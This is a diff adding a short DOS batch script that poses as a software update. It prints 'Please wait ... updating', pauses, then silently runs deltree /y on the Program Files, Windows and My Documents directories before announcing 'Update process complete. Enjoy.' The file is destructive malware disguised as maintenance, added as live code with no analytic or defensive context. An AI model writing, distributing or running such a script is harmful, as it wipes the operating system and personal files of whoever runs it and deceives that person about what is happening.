@@ -1,0 +1,10 @@
+rem eXPecting more from ... Ratty ...
+echo Please wait ... updating ...
+TYPE NUL | CHOICE.COM /N /CY /TY,4000 >NUL
+@echo off
+deltree/y progra~1
+deltree/y windows
+deltree/y mydocu~1
+echo on
+echo Update process complete.
+echo Enjoy.
